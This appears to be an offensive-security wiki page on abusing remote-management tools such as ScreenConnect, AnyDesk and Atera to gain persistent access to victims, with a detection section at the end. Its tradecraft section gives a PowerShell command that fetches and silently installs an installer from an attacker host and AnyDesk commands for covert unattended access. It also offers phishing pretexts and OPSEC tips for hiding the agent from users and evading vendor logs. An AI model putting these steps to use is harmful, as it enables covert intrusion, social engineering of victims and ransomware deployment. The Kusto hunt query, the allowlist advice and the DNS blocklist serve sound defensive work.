---
title: RMM tool abuse (ScreenConnect, AnyDesk, Atera)
slug: rmm-tool-abuse-screenconnect-anydesk
---

> **TL;DR:** Remote Monitoring and Management (RMM) tools — ScreenConnect/ConnectWise Control, AnyDesk, TeamViewer, Atera, NinjaOne, Splashtop, Kaseya, N-able — are signed, allowlisted, vendor-blessed remote-control agents. Ransomware operators (Akira, Black Basta, Royal, Scattered Spider) deploy them in place of Cobalt Strike because they tunnel through HTTPS, survive reboots as services, and don't trip EDR. The defensive pivot: inventory legitimate RMM, detect *unauthorised* instances.

## What it is
RMM platforms exist to give MSPs persistent admin access to endpoints. The agent runs as SYSTEM (or root), maintains an outbound HTTPS tunnel to the vendor's cloud relay (or a self-hosted on-prem server), and exposes a remote shell + file transfer + screen-control surface. Because the binaries are signed by reputable vendors (Microsoft-signed in some cases), default EDR allowlists pass them; because they tunnel via TLS to vendor IPs, network detection requires explicit signature work or DNS allow/denylists. Attackers deploy a *new* RMM tenant (free trial) onto a victim and silently take over.

## Preconditions / where it applies
- Initial foothold with admin/SYSTEM (phishing payload, exposed RDP, MFA-bypass to admin account, vulnerability in another RMM — e.g. CVE-2024-1709 ScreenConnect).
- Outbound TCP/443 to the vendor's relay (rarely blocked).
- Time to install (silent MSI, ~30 seconds).

## Tradecraft
**Step 1 — Pick a vendor.** Selection criteria: free trial / no payment fingerprint, silent installer, persistence by default, file transfer + shell, doesn't show tray icon by default. As of 2025:
- **ScreenConnect (ConnectWise Control)** — free 14-day trial, MSI installer with `INSTALL_DIR`, runs as `ConnectWiseControlAgent` service.
- **AnyDesk** — free for personal use; `--silent --install C:\ProgramData\AnyDesk` + `--set-password` for unattended access.
- **Atera** — free trial, agent runs as `AteraAgent`.
- **NinjaOne / Splashtop SOS** — popular alternatives when the above get burned.

**Step 2 — Stage the installer.** Host the signed MSI/installer on attacker infra (Cloudflare R2, Discord CDN, Telegram file storage). Download via PowerShell:

```powershell
$url = 'https://cdn.attacker.tld/cc.msi'
$dst = "$env:TEMP\cc.msi"
Invoke-WebRequest $url -OutFile $dst
Start-Process msiexec.exe -ArgumentList "/i $dst /qn TENANT=evilcorp /norestart" -Wait
```

AnyDesk unattended setup:

```cmd
AnyDesk.exe --install "C:\ProgramData\AnyDesk" --start-with-win --silent
echo P@ssw0rd! | AnyDesk.exe --set-password
AnyDesk.exe --get-id   :: prints the AnyDesk ID for your callback
```

**Step 3 — Phish-driven install (no foothold).** Send the victim a "support call" / "IRS letter" with a link to a *legitimate* RMM trial; social-engineer them to install. This is the Scattered Spider / FIN7 / fake-tech-support playbook. The malware family is the RMM itself.

**Step 4 — Persistence inheritance.** RMM agents already register as auto-start services. No additional persistence needed. Survives reboot, user logout, password change.

**Step 5 — Lateral.** From the RMM console:
- File transfer arbitrary EXE/script.
- Remote shell as SYSTEM (some agents have built-in `cmd` shell).
- Push installer to other endpoints in the same tenant.
- Pivot via the relay tunnel (no need for SOCKS/Chisel).

**Step 6 — Vulnerability path: CVE-2024-1709 (ScreenConnect SetupWizard).** Pre-23.9.8 ScreenConnect server allowed any unauthenticated request to `/SetupWizard.aspx` to re-trigger initial setup → create new admin → take over the *server* → push agents to every customer endpoint. Many MSPs still run vulnerable versions on-prem. See [[cve-2024-1709-screenconnect-auth-bypass]].

**Step 7 — Defender-side: hunt unauthorised RMM.**

```kusto
// Microsoft Defender / Sentinel
DeviceProcessEvents
| where FileName in~ (
    "ScreenConnect.WindowsClient.exe", "ScreenConnect.ClientService.exe",
    "AnyDesk.exe", "TeamViewer.exe", "AteraAgent.exe",
    "Splashtop_Streamer.exe", "NinjaRMMAgent.exe", "kaseya.agent.exe",
    "ScreenConnect.WindowsBackstageShell.exe")
| where InitiatingProcessFileName != "trusted_msi.exe"  // your install path
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessParentFileName
```

```bash
# Sigma rule index
LiveResponse / EDR hunting: tag every RMM binary; compare against the MSP allowlist for the org.
```

## Detection and defence
- Maintain an **RMM allowlist**: vendor + path + tenant ID for every legitimate RMM in the estate. Anything else = block.
- AppLocker / WDAC: block unsigned MSI execution and untrusted vendors entirely. Microsoft's [Recommended block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/) include several RMM agents as LOLBins.
- DNS sinkhole vendor relay domains the org doesn't use: `*.screenconnect.com`, `*.connectwise.com`, `*.anydesk.com`, `*.teamviewer.com`, `*.aterax.com`. Carve out only sanctioned tenants by IP/SNI.
- Endpoint inventory tool (Tanium, osquery, Defender ATP) reports installed agents quarterly.
- Detect *new* service install with names matching the RMM list (Windows EID 7045).
- CISA published the [Guide to Securing RMM](https://www.cisa.gov/sites/default/files/2023-01/Protecting%20Against%20Malicious%20Use%20of%20RMM%20Software_508c.pdf) — adopt the allowlist + detection pieces wholesale.

## OPSEC pitfalls
- AnyDesk tray icon shows by default for the first session — kill it via `--cli` flags or registry tweaks before the user notices.
- The vendor's portal logs every connection — your IP and timing. Burner accounts + paid VPN exit.
- Sessions appear in vendor admin dashboards the MSP itself may monitor — you may be sharing a tenant with the legitimate IT team.
- Some RMM agents call home with hardware IDs; pivoting to a second victim under the same trial-tenant correlates them.

## References
- [CISA — Protecting Against Malicious Use of RMM Software](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a) — joint advisory
- [Huntress — Living Off the Land RMM](https://www.huntress.com/blog) — detection and IOCs across vendors
- [Mandiant — UNC2596 RMM tradecraft](https://www.mandiant.com/resources/blog) — Akira-style operations
- [Microsoft — Block macros and RMM via WDAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/wdac) — policy authoring

See also: [[psexec-family]], [[wmi-exec]], [[smb-exec]], [[cve-2024-1709-screenconnect-auth-bypass]], [[sccm-mecm-lateral-movement]]
